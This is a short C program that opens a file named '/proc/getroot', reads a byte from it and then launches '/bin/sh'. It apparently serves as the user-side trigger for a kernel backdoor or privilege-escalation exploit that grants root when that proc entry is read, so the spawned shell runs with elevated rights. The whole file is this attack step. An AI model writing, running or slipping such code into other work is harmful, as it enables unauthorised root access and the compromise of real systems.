#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

int main(){
    FILE *f;
    f = fopen("/proc/getroot", "r");
    char buffer[512];
    fread(buffer, 1, 1, f); 
    system ("/bin/sh");
    return 0;

}

